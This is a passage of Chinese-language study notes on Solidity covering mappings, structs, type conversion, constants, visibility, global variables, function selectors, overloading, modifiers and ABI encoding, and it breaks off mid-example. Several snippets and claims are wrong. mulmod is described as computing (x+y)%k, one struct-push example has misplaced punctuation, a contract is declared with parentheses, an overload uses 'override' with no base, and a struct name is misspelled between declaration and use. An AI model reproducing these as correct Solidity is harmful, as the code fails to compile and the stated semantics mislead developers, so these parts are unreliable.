  - `keccak256(abi.encodePacked(s1)) == keccak256(abi.encodePacked(s2))`
  - `keccak256(bytes(s1)) == keccak256(bytes(s2))`:更省 gas
- 字符串无法直接使用下面方法，除非转换成bytes
  - push
  - pop
  - delete
  - `x[start:end]`





#### mapping映射

声明映射类型的语法：`mapping(KeyType=>ValueType)`.

+ `KeyType`：可以是任何内置类型，或者是bytes和string。
+ `ValueType`：可以是任何类型，用户自定义类型也可以。
+ 键是唯一的，赋值方式：`map[a]="test"`
+ mapping支持嵌套。
+ **mapping只能用于状态变量，即只能是storage**
+ mapping可以标记为`public`，solidity会自动创建getter函数。
+ 注意：**mapping中并不存储key，而是存储key的`keccak256`哈希值，从而便于查询实际的值**。



##### 创建、获取、设置、删除

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Mapping{

	mapping(address => uint256) public balances;
	
	//嵌套
	mapping(address => mapping(address => bool)) public friends;
	
	constructor(){
		balances[msg.sender] = 100;
	}
	
	function balanceGet()external view returns(uint256){
		//获取
		return balances[msg.sender];
	}
	
	function balanceSet(uint256 amount)external{
		//设置
		balances[msg.sender] += amount;
	}
	
	function balanceDel()external{
		//删除
		delete balances[msg.sender];
		
		//mapping中的删除和数组或bytes中的删除不一样，不能 delete  balance;
		
	}
}
```



##### 作为局部变量使用

==**`mapping`类型可以用作局部变量，但只能引用状态变量，而且存储位置为storage**。==

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Test{
    //mapping(key => value)，其中key可以为任何类型，bytes或string也可以
    //mapping只能用于状态变量，函数内部是不能定义mapping

    mapping(address=>uint256) public balance;
    mapping(address=>mapping(address=>bool)) public friends;

    function f1()external {
        
        //设置
        balance[msg.sender] = 100;

        //获取
        // uint256 value = balance[msg.sender];

        //删除
        delete balance[msg.sender];

        // delete balance;

		// mapping(address=>uint256) memory ref = balance;  //这种方式会报错，mapping在函数内只能用storage

        mapping(address=>uint256) storage ref = balance;

        ref[msg.sender] = 300;  //这里会改变状态变量balance的值
    }


    function f2()external view returns(uint256){
        return balance[msg.sender];   //返回值为300，说明在引用时对值发生了改变
    }
}
```







#### struct结构体

##### 结构体创建

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Structs{
	
	//定义结构体
	struct Book{       //采用关键字 struct 
		string title;
		string author;
		uint256 book_id;
	}
	
	uint256 private bookId;
	Book[] public bookcase;  //书柜，数组类型
	
	
	function setA1Bookcase()external{
		//第一种方法：顺序和结构一致
		Book memory temp = Book(  // 类似 go语言中的结构体 值赋值。
			unicode"Solidity程序设计",
			"Anbang",
			++bookId
		);  
		bookcase.push(temp);
	}
	
	
	// ✅ 最优方案，推荐: 先写入内存，然后push
	function setB2Bookcase()external{
		//第二种方式：直接push，无变量 
		bookcase.push(
			Book({    //这种形式赋值，为键值对赋值。这种方式有{}，而第一种方式没有
				title:unicode"solidity程序设计",
				author:"Anbang",
				book_id:++bookId
			});  
		)
	}
	
	function setC1Bookcase()external{
		//第三种方式：按字段一个一个赋值
		Book memory temp;
		temp.title=unicode"solidity程序设计";
		temp.author="Anbang";
		temp.book_id=++bookId;
		bookcase.push(temp);
	}
}
```



##### 读取

函数内仅读取结构体，使用memory和storage区别：

+ ==函数内读取并返回，如果使用memory变量接收，会从状态变量拷贝到内存中==，然后将内存中的变量拷贝到返回值，消耗gas多。
+ ==函数内读取并返回，如果使用storage变量接收，直接从状态变量读取（**即引用**）==，状态变量拷贝到返回值。1次拷贝，消耗gas少。
+ ==总结：读取时候推荐使用`storage`==

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
	struct Book{
		string title;
		string author;
		uint256 book_id;
	}
	Book public book = Book("Solidity","Anbang",1);
	
	function get1()external view returns(string memory,string memory,uint256){
		//memory 30029gas
		//函数内读取并返回：使用memory变量接收
		//两次拷贝，所以消耗gas多
		Book memory _book = book;
		return (_book.title,_book.author,_book.book_id);
	}
	
	//storage 29983gas
	//函数内读取并返回：使用storage变量接收
	function get2()external view returns(string memory,string memory,uint256){
		//从状态变量读取，没有拷贝行为
		Book storage _book = book;
		
		//状态变量拷贝到返回值。1次拷贝
		return (_book.title,_book.author,_book.book_id);
	}
}
```

==注意：**如果结构体内包含 `mapping` 类型，则必须使用 `storage`，不可以使用 memeory.**，否则报错 `Type struct ContractName.StructName memory is only valid in storage because it contains a (nested) mapping.`==



##### 修改

函数内获取并修改结构体：

- 因为要修改状态变量，所以使用 storage
- 函数内直接修改变量; 在**修改一个属性**时比较省 Gas 费用
- 函数内先获取存储到 storage 再修改:**修改多个属性**的时候比较省 Gas 费用

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.19;

contract Structs{
	struct Book{
		string title;
		string author;
		uint256 book_id;
	}
	
	uint256 private bookId;
	Book public book1;
	Book public book2;
	
	mapping(address => Book) public students;
	
	//设置book1，不推荐
	function setBook()external {
		Book memory temp;  //这里会从storage中拷贝到memory
		temp.title = unicode"solidity程序设计";
		temp.author = "Anbang";
		temp.book_id = ++bookId;
		book1 = temp;
	}
	
	//设置book2， ✅ 最优方案，推荐:直接修改
	function setBook2()external {
		book2.title = unicode"solidity程序设计";
		book2.author = "Anbang";
		book2.book_id = ++bookId;
	}
	
	// ✅ 最优方案，推荐:直接修改
	function set1Student()external{
		Book storage temp = students[msg.sender];
		temp.title = unicode"solidity程序设计";
		temp.author = "Anbang";
		temp.book_id = ++bookId;
	}
	
}
```



##### 删除

删除结构体的变量，仅仅是重置数据，并不是完全的删除



```solidity
//SPDX-License-Identifier:MIT

contract Demo{
	struct Book{
		string title;
		string author;
		uint256 book_id;
	}
	
	Book public book = Book("solidity","anbang",1);
	
	function del()external{
		delete book;  //只是将结构体的字段重置成默认值了，并不是这个结构体被删除了
	}
}
```







### 类型转换



#### 隐式转换

在赋值、函数参数传递以及应用运算符时，会发生隐式转换。



#### 显示转换

可以使用类型关键字，显示将数据类型转换为另一种类型。





#### 数字转换成字符串

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    //这个函数最关键，比较取巧，用来将uint256类型的 0-9 数字转成字符
    function toStr2(uint256 value) public pure returns (string memory) {
        bytes memory alphabet = "0123456789abcdef";
        //这里把数字转成了bytes32类型，但是因为我们知道数字是 0-9 ，所以前面其实都是填充了0
        bytes memory data = abi.encodePacked(value);
        bytes memory str = new bytes(1);
        //所以最后一位才是真正的数字
        uint256 i = data.length - 1;
        str[0] = alphabet[uint256(uint8(data[i] & 0x0f))];
        return string(str);
    }
}
```





#### 字面常量和基本类型转换



##### 十进制和十六进制字面常量

十进制和十六进制字面常量可以隐式转换为任何足以表示它而不会截断的整数类型：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    uint8 public a = 12; //  可行
    uint32 public b = 1234; // 可行
    uint16 public c = 0x01;
    // uint16 d = 0x123456; // 失败, 会截断为 0x3456  ，int或uint类型会从前面截断
    
    bytes4 public bb = 0x12345678;
    bytes2 public cc =bytes2(bb);    //截断为：0x1234，从后面截断
}
```







##### 整型字面常量与bytesN

- 十进制字面常量不能隐式转换为定长字节数组。
- 十六进制字面常量可以转换为定长字节数组，==**但仅当十六进制数字大小完全符合定长字节数组长度的时候**==。
- 零的**十进制**和**十六进制字面常量**都可以转换为任何定长字节数组类型，**零值是例外，比较特殊**



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.17;

contract Demo{
	//十六进制
	bytes2 public a = 0x1234; //可行
	bytes2 public b = 0x0012; //可行
	//bytes public c = 0x12; //0x12不行，0x1200可行，必须完全符合长度
	
	//十进制
	//bytes4 public x = 1; //不可行
	//bytes2 public y = 2; //不可行
	
	//0和0x0，很特殊
	bytes4 public d = 0x0; //可行
	bytes4 public e = 0; //可行
}
```





##### 字符串字面常量与bytesN

**字符串字面常量和十六进制字符串字面常量可以隐式转换为定长字节数组**（==需要它们的字符数与字节类型的大小相匹配==）

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    bytes2 public a = hex"1234"; // 可行
    bytes2 public b = hex"12"; // 可行
    bytes2 public c = "xy"; // 可行
    bytes2 public d = "x"; // 可行
    // bytes2 public e = hex"123"; // 不可行
    // bytes2 public f = "xyz"; // 不可行
}
```





##### 十六进制字面常量与地址类型

**通过校验和测试的正确大小的十六进制字面常量会作为 `address`类型**。没有其他字面常量可以隐式转换为 `address` 类型。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    address public ads1 = 0xffD0d80c48F6C3C5387b7cfA7AA03970bdB926ac;
    // address public ads2 = 0xffD0d80c48F6C3C5387b7cfA7AA03970bdB926ab; // ❌
}
```









## 变量



### 变量基础知识



#### 初始默认值

solidity是一种静态语言，在声明期间需要指定变量类型。

+ solidity智能合约中所有的变量，都有默认值，没有null或者underfned的概念。

+ 这些变量在没有赋值之前，它的值已默认值的形式存在。

```solidity
//默认值
string ""
bool fasle
int256 0
uint256 0
address 0x0000000000000000000000000000000000000000
bytes32 0x0000000000000000000000000000000000000000000000000000000000000000
enum 0
动态数组 []
定长数组 每个元素的默认值
mapping/struct  所在类型的默认值
```





#### 声明



**合约外定义的类型和函数：**

+ **合约外面可以定义函数和结构体**
  + 定义在合约外面的函数，叫自由函数
  + 定义在合约外面的类型，可以被多个合约使用
+ **合约外 不可以定义变量，但是可以定义常量**

```solidity
//SPDX-License-Identifier:MIT

//定义在合约外的结构，可以被多个合约使用
struct BooK{
	string title;
	string author;
	uint256 book_id;
}

//定义在合约外的函数，叫做自由函数，没有可见性
//自由函数不需要可见性，即不需要使用 public  internal external private
function getBalance()view returns(uint256){
	return address(msg.sender).balance;
}


contract Demo1{
	Book public book1 = Book("solidity","Anbang",1);
	
	function f() public view returns(uint256){
		return getBalance();
	}
}

contract Demo2{
	Book public book2 = Book("solidity","Anbang",2);
}
```





#### 变量状态

+ 状态变量：定义在存储storage中，变量值永久保存在合约的存储空间中，相当于写入区块链中，可以随时调用，除非该链消失。
+ 局部变量：定义在函数内部，变量值仅在函数执行过程中有效，供函数内部使用。调用函数时，变量在内存中。
+ 全局变量：保存在全局命名空间中，用于获取区块链相关信息的特殊变量，存在evm虚拟机中，不用定义，直接获取。







### Constant常量

+ 普通的状态变量，添加`constant`关键词，可声明为常量
+ **常量的gas低很多**
+ 常量名一般使用大写
+ 常量赋值后不可修改
+ 常量必须是**声明和初始化一起**
+ **常量不是存储在`storage`上，函数读取常量不算`view`，可以使用`pure`**。可以在合约外或合约内定义常量，但不能在函数中定义常量
+ **常量只支持值类型（包括地址类型）、字符串和bytes**
+ 可以使用内建函数赋值常量



```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.19;

contract Demo1{
	string public constant NAME = "Anbang";  //定义常量需要使用constant，变量名大写
	
	function getName() external pure returns(string memory){
		return NAME;
	}
}
```



`info.sol`文件：

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.19;

string constant NAME1="Anbang1";
```

`demo.sol`文件，引用`info.sol`文件:

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.19;

import "./info.sol" as INFO;

contract Demo1{
	function getNAME() external pure returns(string memory){
		 return INFO.NAME1;
	}
}
```





支持引用类型中的`string`和`bytes`：

```solidity
//SPDX-Licnese-Identifier:MIT
pragma solidity ^0.8.19;

contract Demo{
	string public constant NAME1="Anbang1";
	bytes public constant NAME2	= "Anbang2";
}
```







### Immutable 不可变量

由于常量的声明和初始化是一起的，否则编译不通过，这给只要一次赋值，又必须是动态赋值的场景带来了不变。



**`Immutable`不可变量，赋值后就不可以修改，而且值是部署时动态赋值的。**

==不可变量可以声明和赋值一起进行，也可以在storage中声明，在合约的构造函数中赋值。无论哪里赋值，只能赋值一次。==



+ 原理：是在运行时赋值
+ 特点：既有constant常量不可修改和gas费低的优势，又有变量动态赋值的优势。
+ 原则：
  + `immutable`可以在storage中声明和初始化一起进行，也可以在`constructor()`构造函数中赋值
  + `immutable`必须在`constructor`运行截止时就赋值
  + 不可以在赋值前读取
  + ==`immutable`不能用在引用类型上，`string`和`bytes`也不支持==
+ 应用场景：在创建不可转移的`owner`时，在创建ERC20的`name`，`symbol`，`decimals`时







### 变量名的命名规则

+ 禁止使用**保留关键字**作为变量名
+ 禁止变量名首字母为数字，必须以字母或下划线开头
+ 变量名大小写敏感







### 变量的可见性

**可见性仅存在于状态变量和函数中**

+ 局部变量的可见性仅限于定义它们的函数，函数可见性分为四种：`private  external  internal  public`
+ 状态变量可见性：`private   internal   public`
+ `internal`和`private`类型的变量不能被外部访问，而`public`变量能够被外部访问。
+ ==注意：设置为`private`和`internal`，只能防止其他合约读取或修改信息，但是它仍然可以在链外查看。==



#### private

`private`：私有，在当前合约中可以访问，在继承的合约中不可访问。



#### internal

`internal`：内部可见（合约内部和被继承的子合约中都可见）

+ **状态变量如果不显示声明，默认是`internal`**





#### public 

`public`：公开可见，合约内部，被继承合约，外部合约都可以调用



注意：编译器会自动为所有`public`状态变量创建`getter`函数。

+ getter函数具有外部（`external`）可见性
+ 如果内部访问getter（即没有用`this`），它被认为是一个状态变量
+ 如果使用外部访问（即用`this`），它被认作为一个函数。



#### external

+ external函数只能从外部调用
+ **如果从内部调用external函数，必须使用this，但是还需注意：必须用view**

```solidity
contract Test2{
    Book public book2 = Book("solidity",1002);
    uint256 public constant PIT = 3;

    function f1(uint256 _x,uint256 _y)external pure returns(uint256){
        // uint256 constant PIT = 3;
        return f(_x,_y);
    }

    function f2(uint256 _x,uint256 _y)external view returns(uint256){
        return this.f1(_x,_y);
    }
}
```









### 全局：时间单位

 在solidity中，秒是缺省单位时间，可以不写。在时间单位之间，数字后面带有`seconds   minutes  hours  days  weeks`可以进行换算，基本关系如下：

- `1 == 1 seconds`
- `1 minutes == 60 seconds`
- `1 hours == 60 minutes`
- `1 days == 24 hours`
- `1 weeks == 7 days`

之前老版本的合约还有 `years` 的概念，现在已经不再用了，从 0.5.0 版本不支持使用 `years` 了。



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Time
contract Demo {
    // 定义全局变量
    uint256 public time;

    constructor() {
        time = 100000000;
    }

    function fSeconds() public view returns (uint256) {
        return time + 1 seconds;
    }

    function fMinutes() public view returns (uint256) {
        return time + 1 minutes;
    }

    function fHours() public view returns (uint256) {
        return time + 1 hours;
    }

    function fDays() public view returns (uint256) {
        return time + 1 days;
    }

    function fWeeks() public view returns (uint256) {
        return time + 1 weeks;
    }
}
```







### 全局：区块和交易属性

| 名称 (返回值)                                                | 返回                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| block.basefee (uint256)                                      | 当前区块的基本费用（ [EIP-3198](https://eips.ethereum.org/EIPS/eip-3198) 和 [EIP-1559](https://eips.ethereum.org/EIPS/eip-1559)） |
| block.chainid (uint256)                                      | 当前链 id                                                    |
| block.difficulty (uint256)(过期了)    block.prevrandao(uint256) | 当前区块的难度                                               |
| block.gaslimit (uint256)                                     | 当前区块的 gaslimit                                          |
| block.number (uint256)                                       | 当前区块的 number                                            |
| block.timestamp (uint256)                                    | 当前区块的时间戳，为 unix 纪元以来的秒                       |
| block.coinbase (address payable)                             | 当前区块矿工的地址                                           |
| msg.sender (address)                                         | 消息发送者 (当前 caller)                                     |
| msg.value (uint256)                                          | 当前消息的 wei 值                                            |
| msg.data (bytes calldata)                                    | 完整的 calldata                                              |
| msg.sig (bytes4)                                             | calldata 的前四个字节 – (function identifier/即函数标识符)   |
| tx.gasprice (uint256)                                        | 交易的 gas 价格                                              |
| tx.origin (address)                                          | 交易的发送方 （完整的调用链）                                |
| blockhash(uint256 blockNumber) returns (bytes32)             | 给定区块的哈希值 – 只适用于 256 最近区块, 不包含当前区块     |
| gasleft() returns (uint256)                                  | 剩余 gas                                                     |





**msg：**

- msg.sender: 只能赋值给普通 address 的变量
- msg.value: 必须用在 payable 函数上
- msg.data: 如果函数不接受参数 msg.data 等于 sig









## 函数



### 函数的定义

**函数可以定义在合约内部，也可以定义合约外部。**

```solidity
function 函数名 参数列表 可见性 可变性 返回值

function f(uint256 x) external pure returns(uint256){
	return x;
}
```

函数可见性：`public  external  internal  private`

状态可见性：`pure  view  payable`，**如果不写`payable/pure/view`中任何一个，则表示该函数既可以读取也可以写入状态变量**







### 函数的调用

要调用函数，只需要使用函数名，并传入参数即可。





### 构造函数

构造函数关键字`constructor`，solidity构造函数是一个特殊函数，**它仅能在智能合约部署时调用一次**，创建之后就能再次使用。

**构造函数是可选的，只允许有一个构造函数，==即构造函数不支持重载==。**



**solidity构造函数常用来进行变量的初始化工作，如：设置合约的owner权限，设置状态变量的初始值。**

==注意：不可以在构造函数中通过`this`来调用函数，因为此时真实的合约实例还没有被创建==

==还需注意：在合约创建过程中，它的代码还是空的，所以直到构造函数执行结束，都不应该在其中调用合约自己的函数。（可以调用，不推荐调用）==

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ErrorModifier{
    address public owner;
    uint public count = 0;

	//带参数的构造函数
     constructor(uint _x){  
         owner = msg.sender;  //设置owner权限
         count = _x;
     }
}
```

==**注意：构造函数，可以带参数，也可以不带参数。**==





### visibility：可见性

+ `private`：函数只能在所定义的智能合约内部调用，在继承的合约内不可以访问
+ `internal`：可以在所定义的智能合约内调用该函数，也可以从继承的合约中调用该函数。
  + internal函数和状态变量可以在当前合约或继承合约里调用。注意不能加`this`，前缀`this`是表示通过外部调用方式访问
+ `external`：只能从合约外部调用，如果要从合约中调用该函数，必须使用`this`。
  + 外部函数是合约接口的一部分，我们可以从其他合约或通过交易来发起调用。
  + 外部函数在接收大的数组数据时更加有效
+ `public`：可以从任何地方调用







### mutability：状态可变性

+ `pure`：既不读取也不修改状态变量，这种函数被称为纯函数
+ `view`：读取状态变量，但是不修改状态变量，这种函数被称为视图函数。**状态变量的Getter方法默认是view函数**
+ `payable`：用payable声明的函数可以接受发送给合约以太币，如果未指定，则函数会自动拒绝所有发送给它的以太币



#### pure不允许的操作

如果函数中存在以下语句，则视为读取状态变量，编译器会抛出警告：

+ 读取状态变量，包括读取`immutable`变量
+ 访问`address(this).balance`或`<address>.balance`
+ 访问`block`、`tx`、`msg`中任何成员（除`msg.sig`和`msg.data`之外）
+ 调用任何未标记为`pure`的函数



#### view不允许的操作

如果函数中存在以下语句，则视为修改状态变量，编译器会抛出警告：

+ 修改状态变量
+ 触发事件
+ 使用`selfdestruct`
+ 通过调用发送以太币
+ 调用任何没有标记为`view`或`pure`的函数
+ 使用底层调用
+ 使用包含某些操作码的内联程序集





### 函数的返回值returns/return



#### 多种返回值

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract FunctionOutputs {
    // 单个返回值
    function returnSingle() public pure returns (uint256) {
        return 1;
    }

    // 多个返回值
    function returnMultiple() public pure returns (uint256, bool) {
        return (1, true);
    }

    // 带有名字的返回值
    // 这个形式等同于赋值给返回参数，然后用 return; 退出。
    function returnName() public pure returns (uint256 u, bool b) {
        return (1, true);
    }

    // 隐式返回，隐式返回可以没有return
    function returnAssigned() public pure returns (uint256 u, bool b) {
        u = 1;
        b = true;
    }
}
```



#### 合约内函数返回值接收

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract FunctionOutputs {
    // 多个返回值
    function returnMultiple() public pure returns (uint256, bool) {
        return (1, true);
    }

    function a() external pure returns (uint256 u, bool b) {
        // 接收返回值
        (uint256 uu, bool bb) = returnMultiple();

        // 只接受一个返回值
        (, bool bbb) = returnMultiple();  //注意：这里需要有变量类型和小括号，如果丢弃某个值就不写变量名
		(uint256 uu,) = returnMultiple();
		

        // 接收并返回
        (u, b) = returnMultiple();
    }
}
```







### 函数的签名/函数标识符



#### 查看msg.data

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Receiver{
	event Log(bytes data1,bytes4 data2);
	
	function transfer(address recipient,uint256 amount) external payable returns(address,uint256){
		emit Log(msg.data,msg.sig);
		return (msg.sender,msg.value);
	}
}
```

- 输入：

  - `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`
  - `1`

- logs 结果：

  - data1（为了方便阅读，我拆分成如下）

    ```
    0xa9059cbb
    0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4
    0000000000000000000000000000000000000000000000000000000000000001
    ```

  - data2 结果如下

    - `0xa9059cbb`

- output 结果：

  - `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`
  - `2`





#### msg.data中函数标识符的实现逻辑

**核心**：`bytes4(keccak256(bytes("transfer(address,uint256)")))`

==一个函数调用数据的前4个字节，指定了要调用的函数。这就是某个函数签名的keccak哈希的前4个字节（bytes32类型是从左取值）。==

函数签名被定义为基础原型的规范表达，而基础原型是**函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔，且没有空格。**



**获取hash后的值，和截取后的值**：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract FunctionSelector {
    function getSelector(string calldata _func)
        external
        pure
        returns (bytes32, bytes4)
    {
        // _func 字符串通过 bytes 转为 bytes
        // 使用 keccak256 进行 Hash值运算
        // 使用 bytes4 截取 keccak256 返回的32位数据
        return (keccak256(bytes(_func)), bytes4(keccak256(bytes(_func))));
    }
}
```

**测试：**

1. 部署
2. 输入 `"transfer(address,uint256)"`
3. 获取结构
   1. `0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b`
   2. `0xa9059cbb`

注意：以上仅仅是背后的原理展示，如果想要获取值，可以通过`.selector` 返回 ABI 函数选择器

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;


library L{
	function f(uint256)external {}
}

contract C{
	function g() public pure returns(bytes4){
		return L.f.selector;
	}
}
```



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
    function f (uint256 x)external pure returns(uint256){
        return x;
    }

    function f1()external pure returns(bytes4,bytes4){
    	//从这里可以看出，只需要函数名和参数列表（不包含返回值列表）
    	//用函数选择器，则必须要带上 合约名/库名
        return (bytes4(keccak256(bytes("f(uint256)"))), Demo.f.selector);
    }
}

/*
	调用f1得到的返回值，函数签名
	0:bytes4: 0xb3de648b
	1:bytes4: 0xb3de648b
*/
```



==**`合约名（库名）.函数名.selector`：表示某个合约/库中函数的签名，即前4个字节。**==



### 函数重载

solidty的函数重载，是指同一个作用域内，相同函数名可以定义多个函数。

**这些相同函数名的函数，参数（参数类型或参数数量）必须不一样**，这样才能保证函数签名不同。

即参数类型或个数不同，返回值参数和个数没有要求，因为要保证函数签名不同，而返回值类型和个数并不在函数签名计算中



**合约中可以具有多个不同参数的同名函数，称为“重载”，这也适用于继承函数。**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Test {

    function sum(uint256 a, uint256 b) public pure virtual returns (uint256) {
        return a + b;
    }

	//函数重载
    function sum(uint256[] memory _arr) public pure override returns (uint256 temp) {
        for (uint256 index = 0; index < _arr.length; index++) {
            temp += _arr[index];
        }
    }

}
```









### modifier：函数修改器

solidity中关键字`modifier`用于声明一个函数修改器

+ 意义：可以将一些通用的操作提取出来，包装成函数修改器，来提高代码的复用性，改善代码效率。
+ 作用：==`modifier`常用于在函数执行前检查某种前置条件==。如：判断地址是否正确，余额是否充足，参数值是否满足。
+ 特点：==`modifier`是一种合约属性，**可被继承**，同时还可以被派生的合约重写==。（修改器是合约的可继承属性，并可能被派生合约覆盖，但前提是它们被标记为 virtual。
  + `_`符号，可以在修改器中出现多次，每处会替换为函数体



#### 不带参数的函数修改器

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract ErrorModifier{
	address public owner;
	uint public count =0;
	
	constructor(){
		owner = msg.sender;
	}
	
	//不带参数的函数修改器
	modifier onlyOwner(){
		require(msg.sender == owner,"must owner address");
		_;
	}
	
	function add()external onlyOwner{
		count++;
	}
}
```







#### 带参数的函数修改器

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ErrorModifier{
     address public owner;
    uint public count = 0;
     
     constructor(){
         owner = msg.sender;
     }
     
     modifier onlyOwner(){
		require(msg.sender == owner,"must owner address");
		_;
	}
     
     //带参数的函数修改器
     modifier greaterThan(uint _x){
     	require(_x > 10,"must be greater than 10");
     	_;
     }
     
     
     //在函数后面，可以跟多个函数修改器
     function f(uint _x) external onlyOwner greaterThan(_x){
     	count = _x;
     }
}
```



#### 函数修改器：修改器内写逻辑

下面是一个防重载的函数修改器，这种使用方法，在低版本的solidity中可以防止重入攻击

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
	bool internal locked;
	
	modifier noReentrant(){
		require(!locked,"no reentrant");
		locked = true;
		_;
		locked = false;
	}
	
	function test()public noReentrant returns(bool){
		return locked;
	}
}
```





### 全局：数学和密码学函数

在全局命名空间中已经预设了一些特殊的变量和函数，他们主要用来提供关于区块链的信息或一些通用的工具函数。



#### 数学和密码学函数

solidity也提供了内置的数学和密码学函数：



**数学函数：**

+ `addmod(uint x,uint y,uint k) returns(uint)`：计算`(x+y)%k`，加法会在任意精度下执行，并且加法的结果即使超过 `2**256` 也不会被截取。从 0.5.0 版本的编译器开始会加入对 `k != 0` 的校验（assert）。
+ `mulmod(uint x,uint y,uint k) returns(uint)`：计算`(x+y)%k`，乘法会在任意精度下执行，并且乘法的结果即使超过 `2**256` 也不会被截取。从 0.5.0 版本的编译器开始会加入对 `k != 0` 的校验（assert）。



**密码学函数：**

+ `keccak256(bytes memory) returns(bytes32)`：计算 keccak-256 哈希，之前 keccak256 的别名函数 **sha3** 在 **0.5.0** 中已经移除。
+ `sha256(bytes memory) returns(bytes32)`，计算参数的 SHA-256 哈希。
+ `ripemd160(bytes memory) returns(bytes20)`：计算参数的 RIPEMD-160 哈希。
+ `ecrecover(bytes32 hash,uint8 v,bytes32 r,bytes32 s) returns(address)`：
  + 利用椭圆曲线签名恢复与公钥相关的地址，错误返回零值
  + 函数参数对应于ECDSA签名的值：
    + r=签名的前32字节
    + s=签名的第2个32字节
    + v=签名的最后一个字节
  + eccrecover 返回一个address，而不是 address payable
  + `ecrecover` 的[使用案例](https://ethereum.stackexchange.com/questions/1777/workflow-on-signing-a-string-with-private-key-followed-by-signature-verificatio)









#### 全局：ABI编码及解码函数

ABI全名（Application Binary Interface），ABI用于底层调用的辅助使用，在合约调用合约的时候使用，可以在不知道对方的合约源码，只需要知道链上逻辑即可。



**ABI编码：**

+ `abi.encode(...) returns(bytes)`：ref:`ABI <ABI>` - **对给定参数进行编码**
+ `abi.encodePacked(...) returns (bytes)`：对给定参数执行 :ref:`紧打包编码 <abi_packed_mode>` ，注意，可以不明确打包编码。
+ `abi.encodeWithSelector(bytes4 selector, ...) returns (bytes)`： :ref:`ABI <ABI>` - 对给定第二个开始的参数进行编码，并以给定的函数选择器作为起始的 4 字节数据一起返回
+ `abi.encodeWithSignature(string signature, ...) returns (bytes)`：等价于 `abi.encodeWithSelector(bytes4(keccak256(signature), ...) returns (bytes)` 
+ `abi.encodeCall(function functionPointer, (...)) returns (bytes memory)`: 使用 tuple 类型参数 ABI 编码调用 `functionPointer` 。执行完整的类型检查, 确保类型匹配函数签名。结果和 `abi.encodeWithSelector(functionPointer.selector, (...)) returns (bytes)`  一致。



**ABI解码：**

- `abi.decode(bytes memory encodedData, (...)) returns (...)`: 对给定的数据进行 ABI 解码，而数据的类型在括号中第二个参数给出 。 例如: `(uint a, uint[2] memory b, bytes memory c) = abi.decode(data, (uint, uint[2], bytes))`







#### encode

`encode`会补零

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract AbiEncode(){
	
	function encode(string memory a , string memory b) external pure returns(bytes memory){
		return abi.encode(a,b);
	}
}
```

```solidity
/**
/**
输入如下参数和返回结果
1.AA,BB
    0x
    0000000000000000000000000000000000000000000000000000000000000040
    0000000000000000000000000000000000000000000000000000000000000080
    0000000000000000000000000000000000000000000000000000000000000002
    4141000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000002
    4242000000000000000000000000000000000000000000000000000000000000
2.AAA,BB
    0x
    0000000000000000000000000000000000000000000000000000000000000040
    0000000000000000000000000000000000000000000000000000000000000080
    0000000000000000000000000000000000000000000000000000000000000003
    4141410000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000002
    4242000000000000000000000000000000000000000000000000000000000000
3.AA,ABB
    0x
    0000000000000000000000000000000000000000000000000000000000000040
    0000000000000000000000000000000000000000000000000000000000000080
    0000000000000000000000000000000000000000000000000000000000000002
    4141000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000003
    4142420000000000000000000000000000000000000000000000000000000000
*/
*/
```







#### encodePacked

**`encodePacked`不会补零，容易导致碰撞错误**（如：两个参数拼在一起，导致参数不同，结果相同）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract AbiEecode {
    function encodePacked(string memory a, string memory b)
        external
        pure
        returns (bytes memory)
    {
        return abi.encodePacked(a, b);
    }
}
```

```solidity
/**
输入如下参数和返回结果
1.AA,BB
    0x41414242
2.AAA,BB
    0x4141414242
3.AA,ABB
    0x4141414242
[AAA,BB] 和 [AA,ABB] 得到的结果相同
*/
```



 **解决 `encodePacked` 的哈希碰撞方法**：可以在要编码的数据中间加一个固定的值，如果

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract AbiDecode {
    function encodePacked(string calldata _test1, string calldata _test2)
        public
        pure
        returns (bytes memory)
    {
        uint256 x = 123;
        return abi.encodePacked(_test1, x, _test2);
    }
}
```

```solidity
/**
输入如下参数和返回结果
1.AA,BB
